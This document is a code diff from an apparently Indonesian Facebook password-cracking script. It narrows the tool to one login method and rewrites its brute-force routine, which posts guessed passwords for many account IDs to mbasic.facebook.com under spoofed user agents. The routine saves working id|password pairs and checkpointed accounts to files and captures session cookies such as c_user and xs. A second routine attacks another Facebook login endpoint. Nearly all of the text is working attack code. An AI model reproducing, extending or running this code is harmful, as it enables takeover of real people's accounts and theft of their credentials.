@@ -1481,25 +1481,10 @@ def setting():
 	else:
 		print(" [+] Pilih Yang Bener Sayang ")
 		exit()
-	Console().print(
-		Panel(
-            f"{P2}[{color_text}01{P2}] Login Site [bold green]mbasic.facebook.com[bold white] [/]\n{P2}[{color_text}02{P2}] Login Site [bold green]validate.facebook.com[bold white]\n{P2}[{color_text}03{P2}] Login Site [bold green]reguler.facebook.com[bold white]\n{P2}[{color_text}04{P2}] Login Site [bold green]m_alpha masengger[bold white] [/]\n{P2}[{color_text}05{P2}] Login Site [bold green]async.facebook.com[bold white] [/]",
-            width=60,
-            style=f"{color_panel}",
-            title="[bold green] Method"))
-	hc = console.input(f" {H2}• {P2}Masukan : ")
 	if hc in ["1", "01"]:
 		method.append("mbasik")
-	elif hc in ["2", "02"]:
-		method.append("validate")
-	elif hc in ["3", "03"]:
-		method.append("reguler")
-	elif hc in ["4", "04"]:
-		method.append("regulerv2")
-	elif hc in ["5", "05"]:
-		method.append("asyn")
 	else:
-		method.append("validate")
+		method.append("mbasik")
 	Console().print(
 		Panel(
             f"[bold white]Apakah Anda Ingin Mengunakan UA Manual ? Y/T",
@@ -1619,18 +1604,10 @@ def metslow():
                         pwv.append(xpwd)
                 else:
                     pass
-                if "reguler" in method:
-                    pool.submit(reguler, idf, pwv,'m.facebook.com')
-                elif "asyn" in method:
-                    pool.submit(asyncc, idf, pwv)
-                elif "validate" in method:
-                    pool.submit(validate, idf, pwv)
-                elif "mbasik" in method:
+                if "mbasik" in method:
                     pool.submit(crackbasi, idf, pwv)
-                elif "regulerv2" in method:
-                    pool.submit(main_alpha, idf, pwv)
                 else:
-                    pool.submit(validate, idf, pwv)
+                    pool.submit(crackbasi, idf, pwv)
     print("")
     Console().print(
         Panel(
@@ -1688,18 +1665,10 @@ def metcepat():
                     for xpwd in pwnya:
                         pwv.append(xpwd)
                 else:pass
-                if "reguler" in method:
-                    pool.submit(reguler, idf, pwv,'m.facebook.com')
-                elif "asyn" in method:
-                    pool.submit(asyncc, idf, pwv)
-                elif "validate" in method:
-                    pool.submit(validate, idf, pwv)
-                elif "mbasik" in method:
+                if "mbasik" in method:
                     pool.submit(crackbasi, idf, pwv)
-                elif "regulerv2" in method:
-                    pool.submit(main_alpha,idf, pwv)
                 else:
-                    pool.submit(validate, idf, pwv)
+                    pool.submit(crackbasi, idf, pwv)
     print("")
     Console().print(
         Panel(
@@ -1718,55 +1687,47 @@ def metcepat():
 
 
 def crackbasi(idf,pwv):
-	global loop,ok,cp
-	prog.update(des,description=f'\r{H}Run 2{P} {H}{idf}{P} {loop} {H}LIVE-:{ok} {K}CHEK-:{cp}  ')
-	prog.advance(des)
-	ua = random.choice(ugen)
-	ses = requests.Session()
-	for pw in pwv:
-		try:
-			link = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
-			data = {"lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),"li":re.search('name="li" value="(.*?)"', str(link.text)).group(1),"try_number":"0","unrecognized_tries":"0","email":idf,"pass":pw,"login":"Masuk","bi_xrwh":re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1)}
-			head = {"Host": "mbasic.facebook.com","Connection": "keep-alive","Content-Length": "181","Cache-Control": "max-age=0","Upgrade-Insecure-Requests": "1","Origin": "https://mbasic.facebook.com","Content-Type": "application/x-www-form-urlencoded","User-Agent": ua,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","X-Requested-With": "mark.via.gp","Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "navigate","Sec-Fetch-User": "?1","Sec-Fetch-Dest": "document","Referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8","Accept-Encoding": "gzip, deflate","Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-			po = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl", data = data, headers = head, allow_redirects=False)
-			if "checkpoint" in po.cookies.get_dict().keys():
-			  print(f"{P}[{K}CP{P}] {idf}|{pw}")
-			  open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-			  akun.append(idf+'|'+pw)
-			  cp+=1
-			  break
-			elif "c_user" in ses.cookies.get_dict().keys():
-				ok+=1
-				coki=po.cookies.get_dict()
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f"{P}[{H}OK{P}] {idf}|{pw}|{kuki}")
-				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
-				break
-			else:
-				continue
-		except requests.exceptions.ConnectionError:
-			time.sleep(31)
-	loop+=1
-def ua_valid():
-    rr = random.randint
-    rc = random.choice
-    android = random.choice(["10","12","13","14"])
-    redmi1 = random.choice(["zh-tw","en-us","zh-cn"])
-    redmi2 = random.choice(["23127PN0CC","23116PN5BC","2206123SC","23076RA4BC","2206122SC","23090RA98C","23013RK75C","22011211C","23078RKD5C","2106118C","2304FPN6DC","22041216UC","22041216C","MI 8 UD"])
-    redmi3 = random.choice(["SP1A.210812.016","UKQ1.230804.001","SKQ1.220303.001","TKQ1.221114.001","TKQ1.220829.002","TP1A.220624.014","TKQ1.220905.001","QKQ1.190828.002"])
-    redmi4 = f"Mozilla/5.0 (Linux; U; Android {android}; {redmi1}; {redmi2} Build/{redmi3}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,109))}.0.{str(rr(4896,5414))}.{str(rr(118,127))} Mobile Safari/537.36 XiaoMi/MiuiBrowser/17.{str(rr(8,9))}.{str(rr(5,221128))} swan-mibrowser"
-    return rc([redmi4])
+    global loop,ok,cp
+    prog.update(des,description=f" {K2}•{H2} Viper {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id2)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
+    prog.advance(des)
+    ua = random.choice(ugen)
+    ses = requests.Session()
+    for pw in pwv:
+        try:
+            if "ya" in ualuh:ua = ualu[0]
+            link = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
+            data = {"lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),"li":re.search('name="li" value="(.*?)"', str(link.text)).group(1),"try_number":"0","unrecognized_tries":"0","email":idf,"pass":pw,"login":"Masuk","bi_xrwh":re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1)}
+            head = {"Host": "mbasic.facebook.com","Connection": "keep-alive","Content-Length": "181","Cache-Control": "max-age=0","Upgrade-Insecure-Requests": "1","Origin": "https://mbasic.facebook.com","Content-Type": "application/x-www-form-urlencoded","User-Agent": ua,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","X-Requested-With": "mark.via.gp","Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "navigate","Sec-Fetch-User": "?1","Sec-Fetch-Dest": "document","Referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8","Accept-Encoding": "gzip, deflate","Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+            po = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl", data = data, headers = head, allow_redirects=False)
+            if "checkpoint" in po.cookies.get_dict().keys():
+                cp += 1
+                tree = Tree(Panel.fit(f"""{K2}{idf}|{pw}{P2}""", style=f"{color_panel}"),guide_style="bold grey100")
+                tree.add(Panel.fit(f"{K2}{cektahun(idf)}{P2}", style=f"{color_panel}"))
+                tree.add(Panel(f"{K2}{ua}{P2}", style=f"{color_panel}"))
+                prints(tree)
+                os.popen("play-audio c.mp3")
+                open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
+                akun.append(idf + "|" + pw)
+                break
+            elif "c_user" in ses.cookies.get_dict().keys():
+                ok += 1
+                coki = po.cookies.get_dict()
+                kuki = ("datr="+ coki["datr"]+ ";"+ ("sb=" + coki["sb"])+ ";"+ "locale=id_ID"+ ";"+ ("c_user=" + coki["c_user"])+ ";"+ ("xs=" + coki["xs"])+ ";"+ ("fr=" + coki["fr"])+ ";")
+                tree = Tree(Panel.fit(f"""{H2}{idf}|{pw}{P2}""", style=f"{color_panel}"),guide_style="bold grey100")
+                tree.add(Panel.fit(f"{H2}{cektahun(idf)}{P2}", style=f"{color_panel}"))
+                tree.add(Panel(f"{H2}{ua}{P2}", style=f"{color_panel}"))
+                tree.add(Panel(f"{H2}{kuki}{P2}", style=f"{color_panel}"))
+                prints(tree)
+                os.popen("play-audio o.mp3")
+                open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
+                break
+            else:
+                continue
+        except requests.exceptions.ConnectionError:
+            time.sleep(31)
+    loop+=1
 
-def iphonee():
-    rr = random.randint
-    rc = random.choice
-    iphone1 = random.choice(["4_3","9_0"])
-    iphone2 = random.choice(["en-US","en-GB","%lang2%"])
-    iphone3 = random.choice(["533.17.9","600.1.4"])
-    iphone4 = random.choice(["5.0.2","9_0"])
-    iphone = f"Mozilla/5.0 (iPhone; CPU iPhone OS {iphone1} like Mac OS X; {iphone2}) adbeat.com/policy AppleWebKit/{iphone3} (KHTML, like Gecko) Version/{iphone4} Mobile/12A366 Safari/{str(rr(600,6533))}.{str(rr(1,18))}.{str(rr(4,5))}"
-    return rc([iphone])
-	
+
 # --------------------[ METODE-MOBILE ]-----------------#
 def asyncc(idf, pwv):
 	global loop, ok, cp
@@ -1774,9 +1735,10 @@ def asyncc(idf, pwv):
 	prog.advance(des)
 	ses = requests.Session()
 	ua = rc(ugen)
-	ua2 = iphonee()
+	ua2 = rc(ugen)
 	for pw in pwv:
 		try:
+            
 			ses.headers.update({"Host": "x.prod.facebook.com","cache-control": "max-age=0","sec-ch-ua-mobile": "?1","upgrade-insecure-requests": "1","user-agent": ua2,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","sec-fetch-site": "none","sec-fetch-mode": "navigate","sec-fetch-dest": "document","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",})
 			link = ses.get(f"https://free.prod.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&next=%2Fcreatorstudio%2F%3Freference%3Dvisit_from_seo&refsrc=deprecated&_rdr")
 			data = {"jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),"uid": idf,"next": "https://free.prod.facebook.com/login/save-device/","flow": "login_no_pin","pass":pw}
